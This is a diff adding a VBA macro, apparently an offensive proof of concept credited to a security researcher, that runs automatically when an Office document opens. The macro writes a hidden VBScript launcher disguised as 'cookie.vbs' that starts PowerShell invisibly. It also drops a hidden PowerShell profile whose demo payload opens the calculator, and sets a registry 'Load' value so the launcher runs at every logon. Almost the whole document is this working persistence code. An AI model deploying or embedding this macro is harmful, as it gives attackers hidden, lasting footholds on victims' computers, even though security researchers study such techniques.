@@ -1,0 +1,52 @@
+'Coded by Matt Nelson
+'twitter.com/enigma0x3
+'enigma0x3.wordpress.com
+
+Sub Auto_Open()
+
+WriteWrapper
+WriteProfile
+Reg
+
+
+
+
+End Sub
+
+Public Function WriteWrapper() As Variant
+Set fs = CreateObject("Scripting.FileSystemObject")
+    Set a = fs.CreateTextFile("C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.txt", True)
+    a.WriteLine ("Dim objShell")
+    a.WriteLine ("Set objShell = WScript.CreateObject(""WScript.Shell"")")
+    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe""")
+    a.WriteLine ("objShell.Run command,0")
+    a.WriteLine ("Set objShell = Nothing")
+    a.Close
+    GivenLocation = "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\"
+    OldFileName = "cookie.txt"
+    NewFileName = "cookie.vbs"
+    Name GivenLocation & OldFileName As GivenLocation & NewFileName
+    SetAttr "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs", vbHidden
+
+End Function
+
+Public Function WriteProfile() As Variant
+Set fs = CreateObject("Scripting.FileSystemObject")
+    Set a = fs.CreateTextFile("C:\Windows\SysNative\WindowsPowerShell\v1.0\Profile.txt", True)
+    a.WriteLine ("Invoke-Item C:\Windows\System32\calc.exe")
+    a.Close
+    GivenLocation = "C:\Windows\SysNative\WindowsPowerShell\v1.0\"
+    OldFileName = "Profile.txt"
+    NewFileName = "Profile.ps1"
+    Name GivenLocation & OldFileName As GivenLocation & NewFileName
+    SetAttr "C:\Windows\SysNative\WindowsPowerShell\v1.0\Profile.ps1", vbHidden
+End Function
+
+Public Function Reg() As Variant
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.RegWrite "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load", "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs", "REG_SZ"
+Set WshShell = Nothing
+
+End Function
+
+
